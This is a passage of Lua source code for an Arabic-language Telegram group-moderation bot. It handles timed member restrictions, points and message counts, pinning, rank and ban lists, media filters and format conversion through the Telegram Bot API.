return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"⋄︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
DevHmD:del(DevTwix.."HmD:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع تقيد » '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تقيده لمدة » "..mutept.." د") 
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع تقيد » '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تقيده لمدة » "..mutept.." س") 
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع تقيد » '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تقيده لمدة » "..mutept.." ي") 
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
---------------------------------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
DevHmD:set('DevTwixTeam:'..DevTwix..'id:user'..msg.chat_id_,TXT)  
DevHmD:setex('DevTwixTeam:'..DevTwix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل عدد الرسائل الان \n⋄︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_HmD(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function Reply(extra, result, success)
DevHmD:del(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevHmD:incrby(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
DevHmD:set('DevTwixTeam:'..DevTwix..'ids:user'..msg.chat_id_,TXT)  
DevHmD:setex('DevTwixTeam:'..DevTwix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل عدد النقاط الان \n⋄︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_HmD(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function Reply(extra, result, success)
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevHmD:get(DevTwix..'HmD:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevHmD:sadd(DevTwix.."HmD:cleaner"..msg.chat_id_, msg.id_) else DevHmD:sadd(DevTwix.."HmD:cleaner"..msg.chat_id_, msg.id_) end end end
if DevHmD:get(DevTwix..'HmD:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevHmD:sadd(DevTwix.."HmD:cleanernum"..msg.chat_id_, msg.id_) else DevHmD:sadd(DevTwix.."HmD:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevHmD:get(DevTwix..'HmD:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevHmD:sadd(DevTwix.."HmD:cleanermusic"..msg.chat_id_, msg.id_) else DevHmD:sadd(DevTwix.."HmD:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevHmD:sismember(DevTwix.."HmD:Lock:Pinpin",msg.chat_id_) and not HMDicConstructor(msg) then
Dev_HmD(msg.chat_id_,msg.id_, 1, "⋄︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevHmD:set(DevTwix..'HmD:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تثبيت الرسالة بنجاح",'md')
return false  
end
if data.code_ == 6 then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
---------------------------------------------------------------------------------------
if text == "المطايه" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Mtte:'..msg.chat_id_)
text = "⋄︙قائمة المطيين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
end end
if #List == 0 then 
text = "⋄︙*لا يوجد مطايه في المجموعة*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
---------------------------------------------------------------------------------------
if text == "الجلاب" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Gell:'..msg.chat_id_)
text = "⋄︙قائمة الجلاب »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
end end
if #List == 0 then 
text = "⋄︙*لا يوجد اجلاب في المجموعة*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if text == "التوج" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:TG:'..msg.chat_id_)
text = "⋄︙قائمة التوج »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
end end
if #List == 0 then 
text = "⋄︙*لا يوجد توج في المجموعة*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:VipMem:'..msg.chat_id_)
text = "⋄︙قائمة المميزين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد مميزين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
---------------------------------------------------------------------------------------
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local HmD =  'HmD:Admins:'..msg.chat_id_
local List = DevHmD:smembers(DevTwix..HmD)
text = "⋄︙قائمة الادمنيه »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⋄︙*لا يوجد ادمنيه*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--------------------------------------------------------------------------------------- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Managers:'..msg.chat_id_)
text = "⋄︙قائمة المدراء »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد مدراء*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Cleaner:'..msg.chat_id_)
text = "⋄︙قائمة المنظفين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد منظفين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
---------------------------------------------------------------------------------------
if HMDicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Constructor:'..msg.chat_id_)
text = "⋄︙قائمة المنشئين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد منشئين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
---------------------------------------------------------------------------------------
if Owner(msg) then
if text == "المالكين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Owner:'..msg.chat_id_)
text = "⋄︙قائمة المالكين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد مالكين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_)
text = "⋄︙قائمة المنشئين الاساسيين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد منشئين اساسيين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "DevTwix")
local msg_id = msg.id_/2097152/0.5
Text = "⋄︙*المنشئ⇠*["..dp.first_name_.."](T.me/"..UserName..")\n"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..dp.first_name_..' ',url="t.me/"..dp.username_ or DevTwix}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..dp.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end
end
end,nil)   
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Muted:'..msg.chat_id_)
text = "⋄︙قائمة المكتومين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد مكتومين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if text == "المقيدين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Tkeed:'..msg.chat_id_)
text = "⋄︙قائمة المقيدين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⋄︙*لا يوجد مقيدين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:Ban:'..msg.chat_id_)
text = "⋄︙قائمة المحظورين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⋄︙*لا يوجد محظورين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if text == "قائمه المنع" and ChCheck(msg) then
local List = DevHmD:hkeys(DevTwix..'HmD:Filters:'..msg.chat_id_)
text = "⋄︙قائمة المنع »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #List == 0 then
text = "⋄︙لا توجد كلمات ممنوعه"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
---------------------------------------------------------------------------------------
if text == "المطورين الاساسيين" and ChCheck(msg) and HmDSudo(msg) or text == "الاساسيين" and HmDSudo(msg) and ChCheck(msg) or text == "» الاساسيين ✧" and HmDSudo(msg) and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:HmDSudo:')
text = "⋄︙قائمة المطورين الاساسيين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⋄︙*عذرا لم يتم رفع اي مطورين اساسيين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if text == "المطورين الثانويين" and SecondSudo(msg) and ChCheck(msg) or text == "الثانويين" and SecondSudo(msg) and ChCheck(msg) or text == "× الثانويين ×" and SecondSudo(msg) and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:SecondSudo:')
text = "⋄︙قائمة المطورين الثانويين »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⋄︙*عذرا لم يتم رفع اي مطورين ثانويين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "× قائمة العام ×" and ChCheck(msg) or text == "× قائمة العام ×" and ChCheck(msg) then 
local BanAll = DevHmD:smembers(DevTwix..'HmD:BanAll:')
local MuteAll = DevHmD:smembers(DevTwix..'HmD:MuteAll:')
if #BanAll ~= 0 then 
text = "⋄︙قائمة المحظورين عام »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(BanAll) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."⋄︙قائمة المكتومين عام »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(MuteAll) do
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "⋄︙*لم يتم حظر او كتم اي عضو*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
---------------------------------------------------------------------------------------
if text == "المطورين" and ChCheck(msg) or text == "× المطورين ×" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix..'HmD:SudoBot:')
text = "*⋄︙قائمة احصائيات مطورين البوت :* \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local sudouser = DevHmD:get(DevTwix..'HmD:Sudos'..v) 
local username = DevHmD:get(DevTwix..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."] ⇠ المجموعات المفعلة : "..(sudouser or 0).."\n"
else
text = text..k.."~ : `"..v.."` ⇠ المجموعات المفعلة : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "⋄︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
---------------------------------------------------------------------------------------
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المالك") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "DevTwix")
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم رفع مالك المجموعه » ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevHmD:sadd(DevTwix.."HmD:HmDConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
---------------------------------------------------------------------------------------
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevHmD:sadd(DevTwix.."HmD:FilterSteckr"..msg.chat_id_,idsticker)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevHmD:sadd(DevTwix.."HmD:FilterPhoto"..msg.chat_id_,photo)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevHmD:sadd(DevTwix.."HmD:FilterAnimation"..msg.chat_id_,idanimation)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
---------------------------------------------------------------------------------------
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevHmD:srem(DevTwix.."HmD:FilterSteckr"..msg.chat_id_,idsticker)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevHmD:srem(DevTwix.."HmD:FilterPhoto"..msg.chat_id_,photo)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevHmD:srem(DevTwix.."HmD:FilterAnimation"..msg.chat_id_,idanimation)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
---------------------------------------------------------------------------------------
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل امر تحويل الصيغ",'md')
DevHmD:del(DevTwix..'HmD:Thwel:HmD'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل امر تحويل الصيغ",'md')
DevHmD:set(DevTwix..'HmD:Thwel:HmD'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevHmD:get(DevTwix..'HmD:Thwel:HmD'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local HmD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..HmD.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local HmD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..HmD.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','⋄︙تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local HmD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..HmD.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"⋄︙تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local HmD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..HmD.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
---------------------------------------------------------------------------------------
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
